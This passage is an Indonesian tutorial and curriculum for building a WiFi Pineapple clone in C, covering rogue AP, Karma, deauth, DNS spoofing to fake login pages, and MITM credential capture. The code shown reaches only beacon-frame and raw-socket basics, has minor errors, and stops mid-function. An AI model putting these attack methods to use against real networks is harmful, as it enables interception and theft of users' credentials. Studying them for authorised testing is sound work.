# 🍍 WiFi Pineapple: Makalah & Kurikulum Lengkap (Full Features)

**Versi:** 4.0  
**Tanggal:** 15 Agustus 2026  
**Penulis:** [Nama Anda]  
**Lisensi:** MIT  

---

## 📋 Daftar Isi

1. [Makalah WiFi Pineapple](#1-makalah-wifi-pineapple) — Penjelasan teori, arsitektur, dan fitur lengkap
2. [Kurikulum Belajar](#2-kurikulum-belajar) — Roadmap 4 bulan untuk semua fitur
3. [Header dan Fungsinya](#3-header-dan-fungsinya) — Penjelasan setiap header yang digunakan
4. [Fase 0: Persiapan](#fase-0-persiapan-minggu-1) — Environment & tools
5. [Fase 1: Rogue AP Basic](#fase-1-rogue-ap-basic-minggu-2-3) — Beacon, probe, auth, assoc
6. [Fase 2: Attack Features](#fase-2-attack-features-minggu-4-5) — Karma, Deauth, Beacon Flooding
7. [Fase 3: Server Features](#fase-3-server-features-minggu-6-7) — DHCP, DNS Spoofing, Logging
8. [Fase 4: MITM & Credential Capture](#fase-4-mitm--credential-capture-minggu-8-9) — HTTP proxy, password capture
9. [Fase 5: Web Dashboard](#fase-5-web-dashboard-minggu-10) — Monitoring & control UI
10. [Fase 6: WPA Handshake Capture](#fase-6-wpa-handshake-capture-minggu-11) — Capture 4-way handshake
11. [Fase 7: Module System & Filtering](#fase-7-module-system--filtering-minggu-12) — Plugins & traffic filtering
12. [Fase 8: Polish & Documentation](#fase-8-polish--documentation-minggu-13-14) — Final testing & packaging
13. [Arsitektur Sistem](#13-arsitektur-sistem) — Diagram dan komponen
14. [Struktur Kode](#14-struktur-kode) — Folder dan file lengkap
15. [Testing & Debugging](#15-testing--debugging) — Tools dan strategi
16. [Referensi](#16-referensi) — Buku, website, tools
17. [Lampiran](#17-lampiran) — Istilah, channel, checklist

---

## 1. Makalah WiFi Pineapple

### 1.1. Abstrak — Ringkasan singkat tentang apa itu WiFi Pineapple dan tujuan proyek

WiFi Pineapple adalah alat penetration testing yang digunakan untuk membuat Rogue Access Point, menangkap kredensial, dan melakukan serangan Man-in-the-Middle (MITM). Proyek ini mengimplementasikan WiFi Pineapple dari nol menggunakan **Bahasa C** tanpa library eksternal, hanya mengandalkan **raw socket** dan **Netlink** bawaan Linux. Makalah ini mencakup semua fitur yang ada pada Hak5 WiFi Pineapple, termasuk Karma Attack, Deauth Attack, WPA Handshake Capture, DNS Spoofing, MITM Proxy, Web Dashboard, dan Module System.

**Kata Kunci:** WiFi Pineapple, Rogue AP, Evil Twin, Karma Attack, Deauth Attack, WPA Handshake, MITM, C Programming, Raw Socket, Netlink

---

### 1.2. Pendahuluan — Latar belakang, tujuan, dan ruang lingkup proyek

#### 1.2.1. Latar Belakang — Sejarah dan alasan proyek ini dibuat

WiFi Pineapple dari Hak5 adalah alat yang sangat populer di kalangan security researcher. Harganya yang mahal (USD 199-499) mendorong kami untuk membuat versi open-source dengan fungsi serupa.

**Nama:** WiFi Pineapple  
**Pengembang:** Hak5  
**Tahun Rilis:** 2008 (generasi pertama)  
**Harga:** $199 - $499  
**Fungsi:** Penetration testing, WiFi security auditing

#### 1.2.2. Tujuan Proyek — Target utama yang ingin dicapai

1. Memahami cara kerja 802.11 protocol secara mendalam
2. Mengimplementasikan Rogue AP dari nol tanpa library eksternal
3. Membangun multi-tool untuk penetration testing dengan semua fitur Hak5 Pineapple
4. Mengembangkan portfolio sebagai security engineer

#### 1.2.3. Ruang Lingkup Proyek — Fitur per fase dan target waktu

| Fase | Fitur | Target Lines | Waktu |
|------|-------|--------------|-------|
| **Fase 1** | Rogue AP dasar (beacon, probe, auth, assoc) | 500 lines | 2 minggu |
| **Fase 2** | Karma attack, Deauth attack, Beacon Flooding | 800 lines | 2 minggu |
| **Fase 3** | DHCP server, DNS spoofing, Logging | 1200 lines | 2 minggu |
| **Fase 4** | MITM proxy, Credential capture | 1600 lines | 2 minggu |
| **Fase 5** | Web Dashboard (monitoring & control) | 2000 lines | 1 minggu |
| **Fase 6** | WPA Handshake Capture | 2300 lines | 1 minggu |
| **Fase 7** | Module System & Filtering | 2600 lines | 1 minggu |
| **Fase 8** | Polish, Documentation, Demo | 2800+ lines | 2 minggu |

---

### 1.3. Fitur WiFi Pineapple (Hak5 vs Proyek Ini) — Perbandingan fitur lengkap

| Fitur | Hak5 Pineapple | Proyek Ini | Keterangan |
|-------|----------------|------------|------------|
| **Harga** | $199-$499 | Gratis (Open Source) | — |
| **Hardware** | Custom board | Adapter WiFi + Linux | Menggunakan TL-WN722N |
| **OS** | Custom OpenWRT | Linux (Debian/Ubuntu) | — |
| **Rogue AP (Evil Twin)** | ✅ | ✅ | Fase 1 |
| **Karma Attack** | ✅ | ✅ | Fase 2 |
| **Deauth Attack** | ✅ | ✅ | Fase 2 |
| **Beacon Flooding** | ✅ | ✅ | Fase 2 |
| **Probe Sniffing** | ✅ | ✅ | Fase 1 |
| **Multiple SSID** | ✅ | ✅ | Fase 2 |
| **WPA Handshake Capture** | ✅ | ✅ | Fase 6 |
| **DHCP Server** | ✅ | ✅ | Fase 3 |
| **DNS Spoofing** | ✅ | ✅ | Fase 3 |
| **MITM Proxy** | ✅ | ✅ | Fase 4 |
| **Credential Capture** | ✅ | ✅ | Fase 4 |
| **Web Dashboard** | ✅ | ✅ | Fase 5 |
| **Module System** | ✅ | ✅ | Fase 7 |
| **Filtering** | ✅ | ✅ | Fase 7 |
| **Logging** | ✅ | ✅ | Fase 3 |
| **Client Tracking** | ✅ | ✅ | Fase 3 |
| **Line Code** | ~50,000 | ~2,800 | — |

---

### 1.4. Teori Dasar WiFi Pineapple — Penjelasan cara kerja setiap fitur

#### 1.4.1. Rogue AP (Evil Twin) — Membuat AP palsu dengan SSID yang sama dengan AP asli

```
┌─────────────────────────────────────────────────────────────┐
│                    ROGUE AP (Evil Twin)                     │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. Broadcast Beacon                                       │
│     "Saya AP dengan SSID FreeWiFi!"                        │
│                                                             │
│  2. Response Probe Request                                 │
│     Client: "Ada FreeWiFi?"                                │
│     AP Palsu: "Saya FreeWiFi!"                             │
│                                                             │
│  3. Authentication                                         │
│     Client: "Boleh connect?"                               │
│     AP Palsu: "Boleh!" (Open System)                       │
│                                                             │
│  4. Association                                            │
│     Client: "Saya mau join"                                │
│     AP Palsu: "Silahkan, AID=1"                            │
│                                                             │
│  5. CONNECTED ✅                                           │
│     Traffic client bisa di-intercept                       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

#### 1.4.2. Karma Attack — Menjawab SEMUA probe request dari client, membuat client auto-connect

```
┌─────────────────────────────────────────────────────────────┐
│                    KARMA ATTACK                             │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. Client broadcast probe request:                        │
│     "Ada AP bernama 'Indihome_1234'?"                      │
│                                                             │
│  2. Karma attack menjawab SEMUA probe:                     │
│     "Saya 'Indihome_1234'!"                                │
│                                                             │
│  3. Client auto-connect (karena pernah connect sebelumnya) │
│                                                             │
│  4. Client terkoneksi ke AP palsu kita                     │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

#### 1.4.3. Deauth Attack — Memutus koneksi client dari AP asli dengan mengirim frame deauth

```
┌─────────────────────────────────────────────────────────────┐
│                    DEAUTH ATTACK                            │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. Client connect ke AP asli "Kantin_WiFi"                │
│                                                             │
│  2. Kita kirim frame deauth ke client:                     │
│     "Kamu harus disconnect!"                               │
│                                                             │
│  3. Client disconnect dari AP asli                         │
│                                                             │
│  4. Client cari AP baru                                    │
│                                                             │
│  5. Karma attack: "Saya Kantin_WiFi!"                     │
│                                                             │
│  6. Client connect ke AP kita!                             │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

#### 1.4.4. Beacon Flooding — Memancarkan banyak SSID palsu untuk membingungkan client

```
┌─────────────────────────────────────────────────────────────┐
│                    BEACON FLOODING                          │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. Buat daftar 100+ SSID palsu:                           │
│     "FreeWiFi", "Indihome_1234", "Telkom_5678", ...       │
│                                                             │
│  2. Kirim beacon untuk setiap SSID secara bergantian:     │
│     Beacon 1: "Saya FreeWiFi"                              │
│     Beacon 2: "Saya Indihome_1234"                         │
│     Beacon 3: "Saya Telkom_5678"                           │
│     ...                                                    │
│                                                             │
│  3. Daftar WiFi di HP korban penuh dengan AP palsu         │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

#### 1.4.5. WPA Handshake Capture — Menangkap 4-way handshake saat client connect

```
┌─────────────────────────────────────────────────────────────┐
│                    WPA HANDSHAKE CAPTURE                    │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Client                          AP Palsu                   │
│    │                               │                       │
│    │ 1. Probe Request              │                       │
│    │─────────────────────────────>│                       │
│    │                               │                       │
│    │ 2. Probe Response             │                       │
│    │<─────────────────────────────│                       │
│    │                               │                       │
│    │ 3. Authentication Request     │                       │
│    │─────────────────────────────>│                       │
│    │                               │                       │
│    │ 4. Authentication Response    │                       │
│    │<─────────────────────────────│                       │
│    │                               │                       │
│    │ 5. Association Request        │                       │
│    │─────────────────────────────>│                       │
│    │                               │                       │
│    │ 6. Association Response       │                       │
│    │<─────────────────────────────│                       │
│    │                               │                       │
│    │ 7. 4-WAY HANDSHAKE START      │ ← CAPTURE DI SINI!   │
│    │<────────────────────────────>│                       │
│    │                               │                       │
│    │ 8. CONNECTED ✅               │                       │
│    │                               │                       │
└─────────────────────────────────────────────────────────────┘
```

#### 1.4.6. MITM (Man-in-the-Middle) — Meng-intercept traffic HTTP dan menangkap kredensial

```
┌─────────────────────────────────────────────────────────────┐
│                    MITM ATTACK                              │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Client → [AP Palsu] → [MITM Proxy] → [Internet]          │
│               ↓                            ↑               │
│          [Credential Capture]              │               │
│               ↓                            │               │
│          [Password Captured!]              │               │
│                                             │               │
│  Semua traffic HTTP bisa di-intercept:                     │
│  - Login password (POST data)                              │
│  - Cookies                                                  │
│  - Form data                                                │
│  - Inject scripts (malware, phishing)                      │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

#### 1.4.7. DNS Spoofing — Mengarahkan domain tertentu ke IP kita untuk phishing

```
┌─────────────────────────────────────────────────────────────┐
│                    DNS SPOOFING                             │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Client: "facebook.com" → DNS Query                        │
│                                                             │
│  DNS Spoofing: "facebook.com = 192.168.1.1"               │
│                                                             │
│  Client: Buka facebook.com → Redirect ke server kita      │
│                                                             │
│  Server kita: Tampilkan fake login page                    │
│                                                             │
│  Client: Isi email + password                              │
│                                                             │
│  Credential Capture: Password tersimpan!                   │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## 2. Kurikulum Belajar

### 2.1. Timeline 4 Bulan — Roadmap lengkap untuk semua fitur

```
Week 1:  Persiapan
         ↓
Week 2-3: Rogue AP Basic (500 lines) ✅
         ↓
Week 4-5: Attack Features (800 lines) ✅
         ↓
Week 6-7: Server Features (1200 lines) ✅
         ↓
Week 8-9: MITM + Credential Capture (1600 lines) ✅
         ↓
Week 10: Web Dashboard (2000 lines) ✅
         ↓
Week 11: WPA Handshake Capture (2300 lines) ✅
         ↓
Week 12: Module System + Filtering (2600 lines) ✅
         ↓
Week 13-14: Polish + Documentation (2800+ lines) ✅

TOTAL: ~2800+ lines
```

### 2.2. Target Mingguan — Ringkasan target per minggu

| Minggu | Target | Output | Fitur yang Dicapai |
|--------|--------|--------|-------------------|
| 1 | Environment ready | Linux + adapter | — |
| 2-3 | Rogue AP basic | SSID muncul + connect | Evil Twin |
| 4-5 | Attack features | Karma + Deauth + Flooding | Karma, Deauth, Beacon Flooding |
| 6-7 | Server features | DHCP + DNS + Logging | DHCP, DNS Spoofing, Logging |
| 8-9 | MITM + Capture | Proxy + Password capture | MITM, Credential Capture |
| 10 | Web Dashboard | Monitoring UI | Web Dashboard |
| 11 | WPA Handshake | Capture 4-way handshake | WPA Handshake Capture |
| 12 | Modules + Filtering | Plugins + Traffic filter | Module System, Filtering |
| 13-14 | Polish | Documentation + Demo | Semua fitur |

---

## 3. Header dan Fungsinya — Penjelasan setiap header yang digunakan dalam proyek

### 3.1. Header Standard C — Library bawaan C

| Header | Fungsi | Digunakan Untuk |
|--------|--------|-----------------|
| **`<stdio.h>`** | Input/Output | `printf()` untuk debug, `perror()` untuk error, `sprintf()` untuk format string, `fopen()` untuk logging |
| **`<stdlib.h>`** | Standard Library | `system()` untuk setup AP mode, `atoi()` untuk parse arguments, `rand()` untuk generate MAC |
| **`<string.h>`** | Manipulasi String | `memcpy()` untuk copy MAC address, `memset()` untuk set broadcast, `strcpy()` untuk copy SSID |
| **`<unistd.h>`** | System Calls | `usleep()` untuk beacon interval, `close()` untuk tutup socket, `sleep()` untuk delay |
| **`<errno.h>`** | Error Handling | `errno` untuk cek error, `EINTR`, `EAGAIN` untuk handle interrupt |
| **`<time.h>`** | Time Functions | `time()` untuk timestamp logging, `ctime()` untuk format waktu |
| **`<signal.h>`** | Signal Handling | `signal()` untuk handle Ctrl+C, `SIGINT` untuk interrupt |
| **`<pthread.h>`** | Multi-threading | `pthread_create()` untuk jalankan thread, `pthread_join()` untuk tunggu thread |
| **`<stdint.h>`** | Fixed-width Integer | `uint8_t`, `uint16_t`, `uint32_t` untuk struktur 802.11 yang portable |
| **`<stdbool.h>`** | Boolean Type | `bool`, `true`, `false` untuk flag konfigurasi |

### 3.2. Header Linux Networking — Library untuk networking

| Header | Fungsi | Digunakan Untuk |
|--------|--------|-----------------|
| **`<sys/socket.h>`** | Socket API | `socket()` untuk buat raw socket, `bind()` untuk ikat ke interface, `sendto()` untuk kirim frame, `recvfrom()` untuk terima frame |
| **`<sys/ioctl.h>`** | Kontrol Perangkat | `ioctl()` untuk kontrol interface, `SIOCGIFINDEX` untuk dapatkan index interface |
| **`<net/if.h>`** | Interface Network | `struct ifreq` untuk informasi interface, `IFNAMSIZ` untuk ukuran nama interface |
| **`<linux/if_packet.h>`** | Raw Socket Layer 2 | `struct sockaddr_ll` untuk alamat layer 2, `AF_PACKET` untuk socket di layer 2, `SOCK_RAW` untuk raw packet |
| **`<linux/if_ether.h>`** | Konstanta Ethernet | `ETH_P_ALL` untuk semua frame, `ETH_ALEN` untuk panjang MAC address |
| **`<arpa/inet.h>`** | Konversi Endian | `htons()` untuk konversi host-to-network (16-bit), `ntohs()` untuk network-to-host (16-bit) |

### 3.3. Kapan Menggunakan Header Apa — Panduan cepat

| Situasi | Header yang Dibutuhkan |
|---------|----------------------|
| **Membuat raw socket** | `<sys/socket.h>`, `<linux/if_packet.h>`, `<net/if.h>` |
| **Mengirim frame 802.11** | `<sys/socket.h>`, `<linux/if_packet.h>`, `<arpa/inet.h>` |
| **Membangun frame 802.11** | `<string.h>`, `<stdint.h>`, `<arpa/inet.h>` |
| **Setup AP mode** | `<stdlib.h>` (system), `<unistd.h>` (sleep) |
| **Multi-threading** | `<pthread.h>` |
| **Logging** | `<stdio.h>`, `<time.h>` |
| **Debugging** | `<stdio.h>` (printf), `<errno.h>` (error) |
| **Ctrl+C handling** | `<signal.h>` |

---

## Fase 0: Persiapan (Minggu 1)

### Tujuan — Menyiapkan environment dan tools yang dibutuhkan

- Memahami konsep dasar C
- Mengenal raw socket
- Setup environment Linux

### Materi Belajar — Topik yang dipelajari setiap hari

| Hari | Topik | Durasi | Materi | Header yang Dipelajari |
|------|-------|--------|--------|----------------------|
| 1 | Install Linux (Ubuntu/Debian) | 2 jam | Dual boot atau VM | — |
| 2 | Belajar C: pointer, struct, socket | 4 jam | Buku "The C Programming Language" | `<stdio.h>`, `<stdlib.h>`, `<string.h>` |
| 3 | Belajar 802.11 frame structure | 3 jam | Lihat file `802.11.md` | `<stdint.h>` |
| 4 | Setup TL-WN722N + monitor mode | 2 jam | `iw dev`, `ip link` | — |
| 5 | Test raw socket dengan tcpdump | 3 jam | `tcpdump -i wlan0 -e` | `<sys/socket.h>`, `<linux/if_packet.h>`, `<net/if.h>` |

### Output yang Diharapkan — Hasil akhir fase ini

```bash
✅ Linux siap (Ubuntu 22.04 LTS)
✅ TL-WN722N terdeteksi (lsusb)
✅ Monitor mode berfungsi (iw dev)
✅ Raw socket berhasil (socket(AF_PACKET))
✅ tcpdump bisa capture frame 802.11
```

### Kode Pertama: `hello_wifi.c` — Test raw socket sederhana

```c
// hello_wifi.c - Test raw socket
// Header yang digunakan:
// - <stdio.h> : printf, perror
// - <sys/socket.h> : socket, bind
// - <linux/if_packet.h> : AF_PACKET, SOCK_RAW
// - <net/if.h> : struct ifreq
// - <sys/ioctl.h> : ioctl
// - <string.h> : strcpy

#include <stdio.h>          // printf, perror
#include <sys/socket.h>     // socket, bind
#include <linux/if_packet.h>// AF_PACKET, SOCK_RAW
#include <net/if.h>         // struct ifreq
#include <sys/ioctl.h>      // ioctl
#include <string.h>         // strcpy

int main() {
    // 1. Buat raw socket — socket() dari <sys/socket.h>
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) {
        perror("socket");   // perror dari <stdio.h>
        return 1;
    }
    printf("[+] Raw socket created: %d\n", sock);  // printf dari <stdio.h>
    
    // 2. Bind ke interface wlan0
    struct ifreq ifr;       // dari <net/if.h>
    struct sockaddr_ll addr;// dari <linux/if_packet.h>
    strcpy(ifr.ifr_name, "wlan0");  // strcpy dari <string.h>
    ioctl(sock, SIOCGIFINDEX, &ifr); // ioctl dari <sys/ioctl.h>
    
    addr.sll_family = AF_PACKET;
    addr.sll_protocol = htons(ETH_P_ALL);
    addr.sll_ifindex = ifr.ifr_ifindex;
    
    if (bind(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("bind");     // perror dari <stdio.h>
        close(sock);
        return 1;
    }
    printf("[+] Bound to wlan0\n");
    
    // 3. Capture 1 frame — recv dari <sys/socket.h>
    uint8_t buf[2048];
    int len = recv(sock, buf, sizeof(buf), 0);
    printf("[+] Captured %d bytes\n", len);
    
    close(sock);  // close dari <unistd.h>
    return 0;
}
```

### Compile & Test — Cara menjalankan kode pertama

```bash
gcc -o hello_wifi hello_wifi.c
sudo ./hello_wifi
```

---

## Fase 1: Rogue AP Basic (Minggu 2-3)

### Tujuan — Membuat AP palsu yang bisa dilihat dan di-connect oleh client

- Membuat AP palsu yang bisa dilihat
- Handle probe request
- Handle auth & assoc

### Header yang Digunakan di Fase Ini

| File | Header | Fungsi |
|------|--------|--------|
| **`config.h`** | `<stdint.h>`, `<stdbool.h>` | Fixed-width integer, boolean |
| **`utils.h/.c`** | `<stdio.h>`, `<string.h>`, `<sys/socket.h>`, `<sys/ioctl.h>`, `<net/if.h>`, `<linux/if_packet.h>`, `<linux/if_ether.h>`, `<arpa/inet.h>` | Utility functions |
| **`rogue_ap.h/.c`** | `"rogue_ap.h"`, `"utils.h"`, `<stdio.h>`, `<string.h>`, `<unistd.h>`, `<stdlib.h>`, `<sys/socket.h>` | Rogue AP core |
| **`sniffer.h/.c`** | `"sniffer.h"`, `"rogue_ap.h"`, `<stdio.h>`, `<string.h>`, `<unistd.h>`, `<sys/socket.h>`, `<sys/ioctl.h>`, `<net/if.h>`, `<linux/if_packet.h>` | Sniffer |
| **`main.c`** | `<stdio.h>`, `<stdlib.h>`, `<string.h>`, `<unistd.h>`, `<pthread.h>`, `<signal.h>`, `"config.h"`, `"rogue_ap.h"`, `"sniffer.h"`, `"utils.h"` | Entry point |

### Struktur Kode — File yang dibuat pada fase ini

```
project/
├── main.c (50 lines)           — Entry point program
├── rogue_ap.c (150 lines)      — Implementasi beacon, probe, auth, assoc
├── rogue_ap.h (20 lines)       — Deklarasi fungsi AP
├── sniffer.c (100 lines)       — Sniffing probe request
├── sniffer.h (15 lines)        — Deklarasi fungsi sniffer
├── utils.c (80 lines)          — Utility functions (MAC, socket)
├── utils.h (15 lines)          — Deklarasi utility
└── config.h (30 lines)         — Konfigurasi global

TOTAL: ~500 lines
```

### Detail File — Isi setiap file pada fase ini

#### `config.h` — Konfigurasi global (30 lines)

```c
#ifndef CONFIG_H
#define CONFIG_H

// ===== HEADER YANG DIGUNAKAN =====
#include <stdint.h>   // uint8_t, uint16_t, uint32_t — untuk fixed-width integer
#include <stdbool.h>  // bool, true, false — untuk flag konfigurasi

// ===== KONSTANTA 802.11 =====
// Digunakan untuk menentukan jenis frame
#define IEEE80211_FTYPE_MGMT       0x00    // Management frame type
#define IEEE80211_STYPE_BEACON     0x08    // Beacon subtype
#define IEEE80211_STYPE_PROBE_REQ  0x04    // Probe Request subtype
#define IEEE80211_STYPE_PROBE_RESP 0x05    // Probe Response subtype
#define IEEE80211_STYPE_AUTH       0x0B    // Authentication subtype
#define IEEE80211_STYPE_ASSOC_REQ  0x00    // Association Request subtype
#define IEEE80211_STYPE_ASSOC_RESP 0x01    // Association Response subtype

// ===== FRAME CONTROL OPCODE =====
// Opcode lengkap untuk Rogue AP
#define IEEE80211_FC_BEACON         0x8000  // Beacon (0x80 << 4)
#define IEEE80211_FC_PROBE_REQ      0x4000  // Probe Request (0x40 << 4)
#define IEEE80211_FC_PROBE_RESP     0x5000  // Probe Response (0x50 << 4)
#define IEEE80211_FC_AUTH           0xB000  // Authentication (0xB0 << 4)
#define IEEE80211_FC_DEAUTH         0xC000  // Deauthentication (0xC0 << 4)
#define IEEE80211_FC_ASSOC_REQ      0x0000  // Association Request (0x00 << 4)
#define IEEE80211_FC_ASSOC_RESP     0x1000  // Association Response (0x10 << 4)

// ===== KONSTANTA UMUM =====
#define BEACON_INTERVAL            100     // Beacon interval in TU (102.4 ms)
#define MAX_SSID_LEN               32      // Maximum SSID length
#define DEFAULT_CHANNEL            6       // Default WiFi channel

// ===== STRUKTUR KONFIGURASI AP =====
// Digunakan oleh semua file untuk menyimpan konfigurasi AP
typedef struct {
    uint8_t bssid[6];                     // BSSID MAC address
    char ssid[MAX_SSID_LEN];              // SSID name
    int channel;                          // WiFi channel
    char monitor_iface[16];               // Monitor mode interface
    char ap_iface[16];                    // AP mode interface
    bool use_virtual;                     // Virtual interface flag
} ap_config_t;

#endif
```

#### `utils.h` — Utility functions (15 lines)

```c
#ifndef UTILS_H
#define UTILS_H

// ===== HEADER YANG DIGUNAKAN =====
#include <stdint.h>   // uint8_t — untuk MAC address
#include "config.h"   // ap_config_t — untuk konfigurasi

// ===== DEKLARASI FUNGSI =====
// Fungsi-fungsi ini diimplementasikan di utils.c
void mac_to_string(const uint8_t *mac, char *str);          // Convert MAC to string
int create_raw_socket(const char *iface);                   // Create raw socket
int send_frame(int sock, const uint8_t *buf, int len, const char *iface); // Send frame
void print_hex(const uint8_t *data, int len);               // Print hex dump

#endif
```

#### `utils.c` — Implementasi utility (80 lines)

```c
// ===== HEADER YANG DIGUNAKAN =====
#include "utils.h"          // Deklarasi sendiri
#include <stdio.h>          // sprintf, printf
#include <string.h>         // memset, strcpy
#include <sys/socket.h>     // socket, sendto
#include <sys/ioctl.h>      // ioctl
#include <net/if.h>         // struct ifreq
#include <linux/if_packet.h>// struct sockaddr_ll
#include <linux/if_ether.h> // ETH_P_ALL
#include <arpa/inet.h>      // htons

// ===== MAC TO STRING =====
// Fungsi: Konversi MAC address ke string untuk display
// Header: <stdio.h> (sprintf)
void mac_to_string(const uint8_t *mac, char *str) {
    sprintf(str, "%02x:%02x:%02x:%02x:%02x:%02x",
            mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

// ===== CREATE RAW SOCKET =====
// Fungsi: Buat socket di layer 2 untuk mengirim/menerima frame
// Header: <sys/socket.h> (socket), <net/if.h> (struct ifreq), <linux/if_packet.h> (AF_PACKET)
int create_raw_socket(const char *iface) {
    int sock;
    struct ifreq ifr;
    
    // socket() — dari <sys/socket.h>
    // AF_PACKET, SOCK_RAW — dari <linux/if_packet.h>
    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) {
        perror("socket");
        return -1;
    }
    
    // ioctl() — dari <sys/ioctl.h>
    // struct ifreq — dari <net/if.h>
    strcpy(ifr.ifr_name, iface);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
        perror("ioctl");
        close(sock);
        return -1;
    }
    
    return sock;
}

// ===== SEND FRAME =====
// Fungsi: Kirim frame melalui raw socket
// Header: <sys/socket.h> (sendto), <linux/if_packet.h> (struct sockaddr_ll)
int send_frame(int sock, const uint8_t *buf, int len, const char *iface) {
    struct sockaddr_ll addr;  // dari <linux/if_packet.h>
    struct ifreq ifr;         // dari <net/if.h>
    
    strcpy(ifr.ifr_name, iface);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
        perror("ioctl");
        return -1;
    }
    
    memset(&addr, 0, sizeof(addr));  // dari <string.h>
    addr.sll_family = AF_PACKET;
    addr.sll_protocol = htons(ETH_P_ALL);
    addr.sll_ifindex = ifr.ifr_ifindex;
    addr.sll_halen = 6;
    
    // sendto() — dari <sys/socket.h>
    int ret = sendto(sock, buf, len, 0, (struct sockaddr*)&addr, sizeof(addr));
    if (ret < 0) perror("sendto");
    return ret;
}

// ===== PRINT HEX =====
// Fungsi: Print hex dump untuk debugging
// Header: <stdio.h> (printf)
void print_hex(const uint8_t *data, int len) {
    for (int i = 0; i < len; i++) {
        printf("%02x ", data[i]);
        if ((i + 1) % 16 == 0) printf("\n");
    }
    printf("\n");
}
```

#### `rogue_ap.h` — Deklarasi AP (20 lines)

```c
#ifndef ROGUE_AP_H
#define ROGUE_AP_H

// ===== HEADER YANG DIGUNAKAN =====
#include "config.h"   // ap_config_t, konstanta 802.11

// ===== DEKLARASI FUNGSI AP =====
// Fungsi-fungsi ini diimplementasikan di rogue_ap.c
int build_beacon(uint8_t *buf, ap_config_t *cfg);           // Build beacon frame (0x8000)
int send_beacon(ap_config_t *cfg);                          // Send beacon
int send_probe_response(ap_config_t *cfg, uint8_t *client_mac); // Send probe response (0x5000)
int send_auth_response(ap_config_t *cfg, uint8_t *client_mac);  // Send auth response (0xB000)
int send_assoc_response(ap_config_t *cfg, uint8_t *client_mac); // Send assoc response (0x1000)
int setup_ap_mode(const char *iface);                      // Setup AP mode via system()

#endif
```

#### `rogue_ap.c` — Implementasi AP (150 lines)

```c
// ===== HEADER YANG DIGUNAKAN =====
#include "rogue_ap.h"      // Deklarasi sendiri
#include "utils.h"         // create_raw_socket, send_frame
#include <stdio.h>         // printf
#include <string.h>        // memcpy, memset, strlen
#include <unistd.h>        // close
#include <stdlib.h>        // system
#include <sys/socket.h>    // socket

// ===== SETUP AP MODE =====
// Fungsi: Setup interface ke AP mode menggunakan iw command
// Header: <stdlib.h> (system), <stdio.h> (printf)
int setup_ap_mode(const char *iface) {
    char cmd[256];
    printf("[+] Setting up AP mode on %s...\n", iface);
    
    // system() — dari <stdlib.h>
    snprintf(cmd, sizeof(cmd), "ip link set %s down", iface);
    system(cmd);
    snprintf(cmd, sizeof(cmd), "iw dev %s set type ap", iface);
    system(cmd);
    snprintf(cmd, sizeof(cmd), "ip link set %s up", iface);
    system(cmd);
    
    return 0;
}

// ===== BUILD BEACON =====
// Fungsi: Bangun frame beacon dengan opcode 0x8000
// Header: <string.h> (memcpy, memset, strlen), <arpa/inet.h> (htons)
int build_beacon(uint8_t *buf, ap_config_t *cfg) {
    // Struktur header 802.11 — menggunakan __attribute__((packed)) dari GCC
    typedef struct {
        uint16_t frame_control;    // 0x8000 = Beacon — pakai htons()
        uint16_t duration;         // 0 = no NAV
        uint8_t addr1[6];          // Destination (broadcast)
        uint8_t addr2[6];          // Source (BSSID)
        uint8_t addr3[6];          // BSSID
        uint16_t seq_ctrl;         // Sequence number — pakai htons()
        uint8_t payload[];
    } __attribute__((packed)) wifi_header_t;
    
    wifi_header_t *hdr = (wifi_header_t*)buf;
    uint8_t *pos = hdr->payload;
    int ssid_len = strlen(cfg->ssid);  // strlen dari <string.h>
    
    if (ssid_len > MAX_SSID_LEN) ssid_len = MAX_SSID_LEN;
    
    // Frame Control: Beacon (0x8000) — htons() dari <arpa/inet.h>
    hdr->frame_control = htons(IEEE80211_FC_BEACON);
    hdr->duration = 0;
    
    // memset() — dari <string.h>
    memset(hdr->addr1, 0xFF, 6);  // Broadcast
    
    // memcpy() — dari <string.h>
    memcpy(hdr->addr2, cfg->bssid, 6);
    memcpy(hdr->addr3, cfg->bssid, 6);
    hdr->seq_ctrl = 0;
    
    // === BEACON BODY ===
    // memset() — dari <string.h>
    memset(pos, 0, 8); pos += 8;  // Timestamp
    
    *pos++ = BEACON_INTERVAL & 0xFF;
    *pos++ = (BEACON_INTERVAL >> 8) & 0xFF;
    
    *pos++ = 0x01; *pos++ = 0x00;  // Capability: ESS
    
    // SSID
    *pos++ = 0;  // Tag: SSID
    *pos++ = ssid_len;
    memcpy(pos, cfg->ssid, ssid_len);
    pos += ssid_len;
    
    // Supported Rates
    *pos++ = 1; *pos++ = 4;
    *pos++ = 0x82; *pos++ = 0x84;
    *pos++ = 0x8B; *pos++ = 0x96;
    
    // Channel
    *pos++ = 3; *pos++ = 1; *pos++ = cfg->channel;
    
    return pos - buf;
}

// ===== SEND BEACON =====
// Fungsi: Kirim beacon frame
// Header: dari utils.h (create_raw_socket, send_frame)
int send_beacon(ap_config_t *cfg) {
    int sock;
    uint8_t buf[512];
    int len;
    
    // create_raw_socket() — dari utils.h
    sock = create_raw_socket(cfg->ap_iface);
    if (sock < 0) return -1;
    
    len = build_beacon(buf, cfg);
    
    // send_frame() — dari utils.h
    int ret = send_frame(sock, buf, len, cfg->ap_iface);
    
    close(sock);  // close dari <unistd.h>
    return ret;
}

// ===== SEND PROBE RESPONSE =====
// Fungsi: Kirim probe response (0x5000) ke client
int send_probe_response(ap_config_t *cfg, uint8_t *client_mac) {
